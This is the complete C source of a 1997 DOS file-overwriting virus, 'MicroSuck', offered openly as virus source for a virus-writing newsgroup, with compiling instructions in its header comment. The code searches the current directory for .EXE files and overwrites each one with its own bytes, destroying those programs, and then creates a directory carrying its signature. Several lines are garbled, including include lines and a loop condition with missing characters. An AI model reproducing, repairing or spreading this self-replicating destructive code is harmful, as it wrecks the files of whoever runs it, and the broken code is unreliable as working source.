/* MicroSuck V.1.0 (c)YeahRight! 1997 By: Techno Phunk 
   one of many high level language viruses writen to shut 
   up some of the people in a.c.v.s.c (alt.comp.virus.source.code) 
   and to show them that it can be done (even by me who has only about 
   2 hours of C++ experience) compile with tc.exe (editor), exe normal 
   This is based on the C++ virus in virology 101, since it is what I 
   looked at to see how to write a virus in C++  I added something 
   before puting it here, and forgot to check for the new size 
   so YOU will have to compile it once, look at the size, then change 
   the variable x to the size....otherwise the "virus" will not be copied 
   compleatly */ 
#include <stdio.h 
#include <dir.h 
#include <dos.h 
FILE *Virus,*Host; 
char buff[512]; 
int x,y,done; 
struct ffblk ffblk; 
int main() 
{ 
 done = findfirst("*.EXE",&ffblk,0);   /* Find a host (EXE file) */ 
   while (!done) 
    { 
    Host=fopen(ffblk.ff_name,"rb+");     /* Open host */ 
    Virus=fopen(_argv[0],"rb");          /* Open our virus  */ 
                                           /* may need to modify the next line */ 
    x=12099;                              /* our lifeforms size */ 
    while (x512)                         /* here we overwrite the host */ 
        {                                 /* 512 byte chunks at a time */ 
        fread(buff,512,1,Virus);          /* ^ sector size ;), could be anything */ 
        fwrite(buff,512,1,Host); 
        x-=512; 
        }                                 /* if 512 or less byes */ 
    fread(buff,x,1,Virus);                /* Finish infection  */ 
    fwrite(buff,x,1,Host); 
    fcloseall();                          /* Close */ 
    done = findnext(&ffblk);              /* try agian */ 
    } 
  mkdir ("MicroSuck (c) 1997 By: Techno Phunk") /* activation would go */ 
                                          /* here                */ 
  return (0);                             /* Terminate           */ 
} 